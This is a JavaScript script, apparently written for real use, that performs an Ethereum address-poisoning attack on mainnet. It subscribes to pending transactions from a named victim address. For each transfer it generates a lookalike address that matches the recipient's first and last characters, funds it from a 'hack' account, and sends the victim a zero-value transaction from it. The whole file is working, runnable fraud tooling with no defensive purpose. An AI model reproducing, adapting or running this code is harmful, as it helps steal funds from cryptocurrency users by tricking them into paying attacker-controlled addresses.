import {
  createWalletClient,
  http,
  parseEther,
  createPublicClient,
  fallback,
} from "viem";
import { privateKeyToAccount, generatePrivateKey } from "viem/accounts";
import { mainnet } from "viem/chains";
import { HACK_PRIVATE_KEY, ALCHEMY_API_KEY, ALCHEMY_RPC } from "./secret.mjs";
import { Network, Alchemy, AlchemySubscription } from "alchemy-sdk";

const VICTIM_ADDRESS = "0x23335657622dcc27bb1914e51cdc30871d6d04d3";
const START_POSITION = 3; // include 0x
const END_POSITION = 3;
const MAX_ATTEMPTS = 1000000; // Set a limit to the number of attempts
const GAS_VALUE = "0.0003"; // Set the amount of gas to send
const send_VALUE = "0"; // Set the amount of gas to send

const settings = {
  apiKey: ALCHEMY_API_KEY,
  network: Network.ETH_MAINNET,
};

// Watch victim address, get transfer address
export function watchVictim() {
  const alchemy = new Alchemy(settings);
  console.log(`watching victim address ${VICTIM_ADDRESS}`);

  // Subscription for Alchemy's pendingTransactions Enhanced API
  alchemy.ws.on(
    {
      method: AlchemySubscription.PENDING_TRANSACTIONS,
      fromAddress: VICTIM_ADDRESS,
      // toAddress: "vitalik.eth",
    },
    (transaction) => {
      if (transaction.input === "0x") {
        console.log(`victim transfer address: ${transaction.to}`);
        attack({ VICTIM_ADDRESS, transferAddress: transaction.to });
      }
    }
  );
}

// generate fake account
export function generateFakeAccount(transferAddress) {
  console.time("get fake address cost time");
  let fakeAddress = "";
  let fakePrivateKey = "";

  const addressStart = transferAddress
    .substring(0, START_POSITION)
    .toLocaleLowerCase();
  const addressEnd = transferAddress
    .substring(transferAddress.length - END_POSITION)
    .toLocaleLowerCase();

  for (let i = 0; i < MAX_ATTEMPTS; i++) {
    const privateKey = generatePrivateKey();
    const account = privateKeyToAccount(privateKey);
    const address = account.address;

    if (
      address.toLocaleLowerCase().startsWith(addressStart) &&
      address.toLocaleLowerCase().endsWith(addressEnd)
    ) {
      fakeAddress = address;
      fakePrivateKey = privateKey;
      console.log("Found fake address: " + address);
      console.log(`Fake address private key: ${privateKey.toString("hex")}`);
      break;
    }

    if (i === MAX_ATTEMPTS - 1) {
      console.log(
        "Reached the maximum number of attempts without finding a match"
      );
      break;
    }
  }
  console.timeEnd("get fake address cost time");
  return { fakeAddress, fakePrivateKey };
}

// attack
export async function attack({ VICTIM_ADDRESS, transferAddress }) {
  const { fakeAddress, fakePrivateKey } = generateFakeAccount(transferAddress);

  const publicClient = createPublicClient({
    chain: mainnet,
    transport: fallback([http(ALCHEMY_RPC)]),
  });

  const gasPrice = await publicClient.getGasPrice();
  const adjustedGasPrice = BigInt(Math.floor(Number(gasPrice) * 1.2));

  // send gas
  const hackAccount = privateKeyToAccount(HACK_PRIVATE_KEY);
  const hackClient = createWalletClient({
    account: hackAccount,
    chain: mainnet,
    transport: fallback([http(ALCHEMY_RPC)]),
  });
  const gasHash = await hackClient.sendTransaction({
    to: fakeAddress,
    value: parseEther(GAS_VALUE),
    gasPrice: adjustedGasPrice,
  });
  console.log(`send gas , gasHash is ${gasHash}`);

  const gasReceipt = await publicClient.waitForTransactionReceipt({
    hash: gasHash,
  });

  // send zero transaction to attack

  if (gasReceipt && gasReceipt.status && gasReceipt.status === "success") {
    console.log(`send gas success`);
    const client = createWalletClient({
      account: privateKeyToAccount(fakePrivateKey),
      chain: mainnet,
      transport: fallback([http(ALCHEMY_RPC)]),
    });
    const attackHash = await client.sendTransaction({
      to: VICTIM_ADDRESS,
      value: parseEther(send_VALUE),
      gasPrice: adjustedGasPrice,
    });
    console.log(`attack , attackHash is ${attackHash}`);

    const attackReceipt = await publicClient.waitForTransactionReceipt({
      hash: attackHash,
    });
    if (
      attackReceipt &&
      attackReceipt.status &&
      attackReceipt.status === "success"
    ) {
      console.log(`attack success`);
    }
  }
}
